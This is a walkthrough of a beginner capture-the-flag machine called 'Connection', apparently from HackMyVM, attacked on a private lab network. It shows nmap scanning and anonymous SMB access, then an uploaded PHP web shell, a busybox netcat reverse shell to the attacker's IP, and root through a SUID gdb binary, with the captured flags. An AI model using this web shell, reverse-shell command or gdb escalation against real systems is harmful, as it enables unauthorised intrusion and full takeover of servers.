# Connection

## Reconnaissance
### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sn 192.168.11.0/24          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 15:41 +07
Nmap scan report for 192.168.11.1
Host is up (0.010s latency).
MAC Address: 0A:00:27:00:00:0B (Unknown)
Nmap scan report for 192.168.11.2
Host is up (0.010s latency).
MAC Address: 08:00:27:C2:00:F1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.11.11
Host is up (0.00093s latency).
MAC Address: 08:00:27:71:CD:2C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.11.10
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.30 seconds
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.11.11  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 15:41 +07
Nmap scan report for 192.168.11.11
Host is up (0.00079s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:71:CD:2C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1d19h50m23s, deviation: 2h18m34s, median: -1d21h10m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-01T11:32:06
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2026-05-01T07:32:07-04:00
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.24 seconds
```
## Initial Access
### SMB Enumeration
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ smbclient -L //192.168.11.11/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        share           Disk      
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Private Share for uploading files)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            CONNECTION
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ smbclient //192.168.11.11/share -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 23 08:48:39 2020
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  html                                D        0  Fri May  1 16:13:03 2026

                7158264 blocks of size 1024. 5455920 blocks available
smb: \> cd html\
smb: \html\> ls
  .                                   D        0  Fri May  1 16:13:03 2026
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  index.html                          N    10701  Wed Sep 23 08:48:45 2020

                7158264 blocks of size 1024. 5455920 blocks available
```
### Remote Code Execution (RCE)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat shell.php 
<?php system($_GET["cmd"]); ?>
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ smbclient //192.168.11.11/share -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd html\
smb: \html\> put shell.php
smb: \html\> ls
  .                                   D        0  Fri May  1 16:13:03 2026
  ..                                  D        0  Wed Sep 23 08:48:39 2020
  index.html                          N    10701  Wed Sep 23 08:48:45 2020
  shell.php                           A       31  Fri May  1 16:13:03 2026

                7158264 blocks of size 1024. 5455880 blocks available
smb: \html\> 
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl "http://192.168.11.11/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                                                    
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl "http://192.168.11.11/shell.php?cmd=hostname"
connection
```
### Gaining a Reverse Shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl "http://192.168.11.11/shell.php?cmd=busybox%20nc%20192.168.11.10%204444%20-e%20%2Fbin%2Fbash"

```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.11] 34622
id; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
connection
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@connection:/var/www/html$ ls  
ls
index.html  shell.php
www-data@connection:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ stty -a                           
speed 38400 baud; rows 28; columns 85; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>;
swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff
-iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl
echoke -flusho -extproc
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444
                               export SHELL=bash
www-data@connection:/var/www/html$ export TERM=xterm-256color
www-data@connection:/var/www/html$ stty rows 28 columns 85
www-data@connection:/var/www/html$ reset
```

## Privilege Esacalation
### SUID Binary Enumeration
```bash
www-data@connection:/var$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
connection:x:1000:1000:connection,,,:/home/connection:/bin/bash
```
```bash
www-data@connection:/home/connection$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
```
### Exploiting GDB
![reverse-shell](/walkthroughs/hackmyvm/machines/beginner/Connection/reverse-shell.png)

```bash 
www-data@connection:/home/connection$ gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
bash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-5.0# pwd
/home/connection
bash-5.0# ls
local.txt
bash-5.0# cat local.txt 
3f491443a2a6aa82bc86a3cda8c39617
bash-5.0# cd ../../
bash-5.0# ls
bin   etc         initrd.img.old  lib64       media  proc  sbin  tmp  vmlinuz
boot  home        lib             libx32      mnt    root  srv   usr  vmlinuz.old
dev   initrd.img  lib32           lost+found  opt    run   sys   var
bash-5.0# cd root/
bash-5.0# ls
proof.txt
bash-5.0# cat proof.txt 
a7c6ea4931ab86fb54c5400204474a39
```
